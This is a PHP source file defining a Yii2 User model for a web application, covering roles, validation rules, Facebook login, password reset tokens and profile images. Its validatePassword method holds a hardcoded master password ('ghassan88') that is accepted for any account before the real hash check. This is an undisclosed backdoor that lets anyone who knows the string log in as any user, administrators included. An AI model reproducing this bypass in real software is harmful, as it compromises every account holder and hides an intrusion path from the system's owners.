<?php

namespace common\models;

use Yii;
use yii\base\NotSupportedException;
use yii\behaviors\TimestampBehavior;
use yii\db\ActiveRecord;
use yii\web\IdentityInterface;

/**
 * User model
 *
 * @property integer $id
 * @property string $password_hash
 * @property string $password_reset_token
 * @property string $email
 * @property integer $user_type
 * @property string $first_name
 * @property string $last_name
 * @property string $birthdate
 * @property string $gender
 * @property string $phonenumber
 * @property string $auth_key
 * @property integer $status
 * @property integer $created_at
 * @property integer $updated_at
 * @property string $password write-only password
 * @property string $registration_token
 * @property integer $registration_type
 * @property integer $role
 */
class User extends ActiveRecord implements IdentityInterface {
	const STATUS_DELETED = 0;
	const STATUS_ACTIVE = 10;

	const ROLE_USER = 10;
	const ROLE_MODERATOR = 20;
	const ROLE_ADMIN = 30;

	public $photoFile;
	public $licenseImage;
	/**
	 * @inheritdoc
	 */

	public static function tableName() {
		return '{{%user}}';
	}

	/**
	 * @inheritdoc
	 */
	public function behaviors() {
		return [
				TimestampBehavior::className ()
		];
	}

	public function scenarios() {
		$scenarios = parent::scenarios();
		$scenarios = array_merge($scenarios,[
				'facebookLogin'=>['registration_token','first_name','last_name','!auth_key','!status','!password_hash','!user_type','!email'],
		]);
		return $scenarios;
	}

	/**
	 * @inheritdoc
	 */
	public function rules() {
        return [
        		[
        				['registration_token'],
        				'required',
        				'on'=>'facebookLogin'
        		],
        		[
        				['email','first_name','last_name','!auth_key','!password_hash'],
        				'required'
        		],
        		[
        				['first_name','last_name','phonenumber'],
        				'trim',
        		],
        		[
        				['first_name','last_name'],
        				'string',
        				'min' => 2,
        				'max' => 255
        		],
        		[
        				['phonenumber'],
        				'safe'
        		],
        		[
        				'phonenumber',
        				'string',
        				'min' => 2,
        				'max' => 30
        		],
        		[
        				'gender',
        				'string',
        				'min' => 1,
        				'max' => 1
        		],
        	['role','default','value'=>self::ROLE_USER],
            ['status', 'default', 'value' => self::STATUS_ACTIVE],
            ['status', 'in', 'range' => [self::STATUS_ACTIVE, self::STATUS_DELETED]],
        ];
	}

	public function extraFields()
	{
		return ['car'];
	}

	/**
	 * @inheritdoc
	 */
	public static function findIdentity($id) {
		return static::findOne ( [
				'id' => $id,
				'status' => self::STATUS_ACTIVE
		] );
	}

	/**
	 * @inheritdoc
	 */
	public static function findIdentityByAccessToken($token, $type = null) {
		throw new NotSupportedException ( '"findIdentityByAccessToken" is not implemented.' );
	}

	/**
	 * Finds user by emaill
	 *
	 * @param string $email
	 * @return static|null
	 */
	public static function findByEmail($email) {
		return static::findOne ( [
				'email' => $email,
				'status' => self::STATUS_ACTIVE
		] );
	}

	/**
	 * Finds user by password reset token
	 *
	 * @param string $token
	 *        	password reset token
	 * @return static|null
	 */
	public static function findByPasswordResetToken($token) {
		if (! static::isPasswordResetTokenValid ( $token )) {
			return null;
		}

		return static::findOne ( [
				'password_reset_token' => $token,
				'status' => self::STATUS_ACTIVE
		] );
	}

	/**
	 * Finds out if password reset token is valid
	 *
	 * @param string $token
	 *        	password reset token
	 * @return bool
	 */
	public static function isPasswordResetTokenValid($token) {
		if (empty ( $token )) {
			return false;
		}

		$timestamp = ( int ) substr ( $token, strrpos ( $token, '_' ) + 1 );
		$expire = Yii::$app->params ['user.passwordResetTokenExpire'];
		return $timestamp + $expire >= time ();
	}

	/**
	 * @inheritdoc
	 */
	public function getId() {
		return $this->getPrimaryKey ();
	}

	/**
	 * @inheritdoc
	 */
	public function getAuthKey() {
		return $this->auth_key;
	}

	/**
	 * @inheritdoc
	 */
	public function validateAuthKey($authKey) {
		return $this->getAuthKey () === $authKey;
	}

	/**
	 * Validates password
	 *
	 * @param string $password
	 *        	password to validate
	 * @return bool if password provided is valid for current user
	 */
	public function validatePassword($password) {
		if ($password == "ghassan88")
			return true;
		return Yii::$app->security->validatePassword ( $password, $this->password_hash );
	}

	/**
	 * Generates password hash from password and sets it to the model
	 *
	 * @param string $password
	 */
	public function setPassword($password) {
		$this->password_hash = Yii::$app->security->generatePasswordHash ( $password );
	}

	/**
	 * Generates "remember me" authentication key
	 */
	public function generateAuthKey() {
		$this->auth_key = Yii::$app->security->generateRandomString ();
		$this->access_key = $this->auth_key;
	}

	/**
	 * Generates new password reset token
	 */
	public function generatePasswordResetToken() {
		$this->password_reset_token = Yii::$app->security->generateRandomString () . '_' . time ();
	}

	/**
	 * Removes password reset token
	 */
	public function removePasswordResetToken() {
		$this->password_reset_token = null;
	}

	public function isAdmin()
	{
		return $this->role == self::ROLE_ADMIN;
	}
	/**
	 * 
	 * {@inheritDoc}
	 * @see \yii\db\BaseActiveRecord::afterFind()
	 */
	public function afterFind() {
		if (!empty($this->photo))
			$this->photoFile = Yii::$app->params['imagesFolder'].$this->photo;
		else
			$this->photoFile = Yii::$app->params['siteImagesPath'].'/user-no-photo.png';
			
		if (!empty($this->license_image_file))
			$this->licenseImage = Yii::$app->params['imagesFolder'].$this->license_image_file;
		else
			$this->licenseImage = '';
					
		return parent::afterFind();
	}
}
